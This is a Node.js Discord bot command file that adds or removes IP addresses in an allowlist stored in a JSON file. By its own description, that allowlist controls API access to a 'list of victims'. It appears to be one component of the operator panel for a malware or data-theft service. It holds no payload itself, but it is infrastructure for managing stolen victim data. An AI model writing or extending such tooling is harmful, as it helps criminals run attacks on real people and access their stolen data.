const fs = require('node:fs')
const path = require('node:path')

const {
    SlashCommandBuilder
} = require('discord.js')

module.exports = {
    data: new SlashCommandBuilder()
        .setName('ip')
        .setDescription('Adds or removes an IP to access your list of victims via the API.')
        .addStringOption(option =>
            option.setName('ip')
            .setDescription('The IP to add or remove.')
            .setRequired(true))
        .addBooleanOption(option =>
            option.setName('add')
            .setDescription('True to add, false to remove.')
            .setRequired(true)),
    async execute(interaction) {
        try {
            const ip = interaction.options.getString('ip')
            const add = interaction.options.getBoolean('add')

            let data = JSON.parse(await fs.promises.readFile(path.join('bot', 'profile', 'ip.json'), 'utf-8'))
            const index = data.indexOf(ip)

            if (add) {
                if (index !== -1) {
                    return await interaction.reply({
                        content: `The IP \`${ip}\` is already in the list.`,
                        ephemeral: true
                    })
                }
                data.push(ip)
                await fs.promises.writeFile(path.join('bot', 'profile', 'ip.json'), JSON.stringify(data, null, 3))
                return await interaction.reply({
                    content: `The IP \`${ip}\` has been added to the list.`,
                    ephemeral: true
                })
            } else {
                if (index === -1) {
                    return await interaction.reply({
                        content: `The IP \`${ip}\` is not in the list.`,
                        ephemeral: true
                    })
                }
                data.splice(index, 1)
                await fs.promises.writeFile(path.join('bot', 'profile', 'ip.json'), JSON.stringify(data, null, 3));
                return await interaction.reply({
                    content: `The IP \`${ip}\` has been removed from the list.`,
                    ephemeral: true
                })
            }
        } catch (error) {
            console.log(error)
            return await interaction.reply({
                content: `An error occurred while trying to add or remove the IP.`,
                ephemeral: true
            })
        }
    },
}